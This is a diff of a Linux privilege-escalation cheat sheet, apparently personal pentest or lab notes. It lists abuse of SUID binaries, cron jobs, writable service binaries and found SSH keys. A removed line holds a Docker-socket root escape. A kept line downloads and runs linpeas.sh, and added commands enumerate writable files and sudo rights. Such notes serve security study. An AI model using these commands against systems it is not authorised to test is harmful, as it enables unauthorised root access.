@@ -4,8 +4,6 @@ SUID binary → google GTFOBins <binary>; test safe commands locally.
 Writable service binary → replace with benign script (lab): sudo systemctl stop <srv> → replace exec → sudo systemctl start <srv>.
 Cron runs script from /var/www → upload web file that cron will execute as root.
 SSH private key found → ssh -i id_rsa user@other-host.
-Docker socket writable → run docker run -v /:/host --rm -it alpine chroot /host sh.
-PHAR / upload deserialization → upload crafted .phar and trigger file_exists("phar://...") or include.
 
 Linux: linpeas.sh, LinEnum.sh, pspy, lse.sh
 curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
@@ -110,5 +108,14 @@ df -h
 getfacl -R /some/dir 2>/dev/null | sed -n '1,120p'
 # find suid world-writable files
 find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -ld {} \; 2>/dev/null | head
+
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null // find writable directories
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null // find writable files 
+
+ls -la /etc/cron.daily/ // daily cron job in linux as scheldured task on Windows
+
+sudo -l // check if user can run binary as root .... SEARCH NOPASSWD()
+
+grep -r -l 'search-query-here' /path/to/search // search files witch contain -l ''
 
 
